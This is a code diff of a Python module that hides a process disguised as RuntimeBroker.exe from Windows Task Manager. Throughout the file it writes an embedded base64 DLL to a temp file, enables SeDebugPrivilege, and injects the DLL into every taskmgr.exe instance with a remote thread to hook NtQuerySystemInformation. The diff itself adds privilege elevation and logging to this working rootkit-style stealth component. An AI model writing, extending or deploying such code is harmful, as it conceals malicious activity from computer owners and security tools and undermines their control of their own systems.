@@ -1,15 +1,17 @@
 """
 process_hider.py - Hide RuntimeBroker.exe from Task Manager.
-Injects a DLL into taskmgr.exe that hooks NtQuerySystemInformation
-to filter out our process from the process list.
+Injects a DLL into taskmgr.exe that hooks NtQuerySystemInformation.
 """
 import base64
 import ctypes
 import ctypes.wintypes as wt
+import logging
 import os
 import tempfile
 import threading
 import time
+
+_log = logging.getLogger("cpdbg")
 
 # fmt: off
 # Pre-compiled hider.dll (5120 bytes, x64, GCC 15.1, no CRT)
@@ -107,14 +109,19 @@ _DLL_B64 = (
 )
 # fmt: on
 
+# Win32
 PROCESS_ALL_ACCESS = 0x1F0FFF
 MEM_COMMIT = 0x1000
 MEM_RESERVE = 0x2000
 PAGE_READWRITE = 0x04
 MEM_RELEASE = 0x8000
 TH32CS_SNAPPROCESS = 0x02
+TOKEN_ADJUST_PRIVILEGES = 0x0020
+TOKEN_QUERY = 0x0008
+SE_PRIVILEGE_ENABLED = 0x00000002
 
 kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+advapi32 = ctypes.WinDLL('advapi32', use_last_error=True)
 
 
 class PROCESSENTRY32(ctypes.Structure):
@@ -130,6 +137,57 @@ class PROCESSENTRY32(ctypes.Structure):
         ("dwFlags", wt.DWORD),
         ("szExeFile", ctypes.c_char * 260),
     ]
+
+
+class LUID(ctypes.Structure):
+    _fields_ = [("LowPart", wt.DWORD), ("HighPart", wt.LONG)]
+
+
+class LUID_AND_ATTRIBUTES(ctypes.Structure):
+    _fields_ = [("Luid", LUID), ("Attributes", wt.DWORD)]
+
+
+class TOKEN_PRIVILEGES(ctypes.Structure):
+    _fields_ = [
+        ("PrivilegeCount", wt.DWORD),
+        ("Privileges", LUID_AND_ATTRIBUTES * 1),
+    ]
+
+
+def _enable_debug_privilege():
+    """Enable SeDebugPrivilege — needed to inject into taskmgr.exe."""
+    token = wt.HANDLE()
+    ok = advapi32.OpenProcessToken(
+        kernel32.GetCurrentProcess(),
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+        ctypes.byref(token))
+    if not ok:
+        _log.debug("HIDER: OpenProcessToken failed: %s", ctypes.get_last_error())
+        return False
+
+    luid = LUID()
+    ok = advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid))
+    if not ok:
+        kernel32.CloseHandle(token)
+        _log.debug("HIDER: LookupPrivilegeValue failed: %s", ctypes.get_last_error())
+        return False
+
+    tp = TOKEN_PRIVILEGES()
+    tp.PrivilegeCount = 1
+    tp.Privileges[0].Luid = luid
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+
+    ok = advapi32.AdjustTokenPrivileges(
+        token, False, ctypes.byref(tp),
+        ctypes.sizeof(tp), None, None)
+    err = ctypes.get_last_error()
+    kernel32.CloseHandle(token)
+
+    if ok and err == 0:
+        _log.debug("HIDER: SeDebugPrivilege enabled")
+        return True
+    _log.debug("HIDER: AdjustTokenPrivileges err=%s", err)
+    return False
 
 
 def _find_pids(name):
@@ -156,28 +214,43 @@ def _find_pids(name):
 def _inject_dll(pid, dll_path):
     h = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
     if not h:
+        _log.debug("HIDER: OpenProcess(%d) FAILED err=%s", pid, ctypes.get_last_error())
         return False
+
     dll_bytes = dll_path.encode('utf-8') + b'\x00'
     addr = kernel32.VirtualAllocEx(h, 0, len(dll_bytes),
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
     if not addr:
+        _log.debug("HIDER: VirtualAllocEx FAILED err=%s", ctypes.get_last_error())
         kernel32.CloseHandle(h)
         return False
+
     written = ctypes.c_size_t(0)
-    kernel32.WriteProcessMemory(h, addr, dll_bytes, len(dll_bytes),
-                                ctypes.byref(written))
-    k32 = kernel32.GetModuleHandleA(b"kernel32.dll")
-    ll = kernel32.GetProcAddress(k32, b"LoadLibraryA")
-    if not ll:
+    ok = kernel32.WriteProcessMemory(h, addr, dll_bytes, len(dll_bytes),
+                                     ctypes.byref(written))
+    if not ok:
+        _log.debug("HIDER: WriteProcessMemory FAILED err=%s", ctypes.get_last_error())
         kernel32.VirtualFreeEx(h, addr, 0, MEM_RELEASE)
         kernel32.CloseHandle(h)
         return False
+
+    k32 = kernel32.GetModuleHandleA(b"kernel32.dll")
+    ll = kernel32.GetProcAddress(k32, b"LoadLibraryA")
+    if not ll:
+        _log.debug("HIDER: GetProcAddress(LoadLibraryA) FAILED")
+        kernel32.VirtualFreeEx(h, addr, 0, MEM_RELEASE)
+        kernel32.CloseHandle(h)
+        return False
+
     thread = kernel32.CreateRemoteThread(h, None, 0, ll, addr, 0, None)
     if thread:
         kernel32.WaitForSingleObject(thread, 5000)
         kernel32.CloseHandle(thread)
         kernel32.CloseHandle(h)
+        _log.debug("HIDER: Injected into PID %d OK", pid)
         return True
+
+    _log.debug("HIDER: CreateRemoteThread FAILED err=%s", ctypes.get_last_error())
     kernel32.CloseHandle(h)
     return False
 
@@ -194,14 +267,22 @@ class ProcessHider:
     def start(self):
         if self._running:
             return
+
+        # Enable SeDebugPrivilege first
+        _enable_debug_privilege()
+
+        # Write DLL to temp
         try:
             dll_data = base64.b64decode(_DLL_B64)
             fd, path = tempfile.mkstemp(suffix='.dll', prefix='rt_')
             os.write(fd, dll_data)
             os.close(fd)
             self._dll_path = path
-        except Exception:
+            _log.debug("HIDER: DLL written to %s (%d bytes)", path, len(dll_data))
+        except Exception as exc:
+            _log.debug("HIDER: DLL write failed: %s", exc)
             return
+
         self._running = True
         self._thread = threading.Thread(target=self._monitor, daemon=True,
                                         name='hider')
@@ -224,8 +305,9 @@ class ProcessHider:
                 self._injected_pids &= set(pids)
                 for pid in pids:
                     if pid not in self._injected_pids:
+                        _log.debug("HIDER: Found taskmgr PID=%d, injecting...", pid)
                         if _inject_dll(pid, self._dll_path):
                             self._injected_pids.add(pid)
-            except Exception:
-                pass
+            except Exception as exc:
+                _log.debug("HIDER: Monitor error: %s", exc)
             time.sleep(3)
